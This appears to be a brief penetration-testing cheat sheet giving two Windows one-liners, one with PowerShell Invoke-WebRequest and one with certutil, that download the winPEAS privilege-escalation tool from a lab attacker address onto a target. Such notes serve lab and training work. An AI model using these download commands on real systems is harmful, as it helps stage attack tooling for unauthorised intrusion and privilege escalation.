
## powershell

```powershell
powershell Invoke-WebRequest -Uri "http://10.10.14.7/winPEASany.exe" -OutFile "winPEASany.exe" 
```

## certutil.exe

```powershell
certutil.exe -urlcache -split -f "http://10.10.14.7/winPEASany.exe" winpeas.exe
```
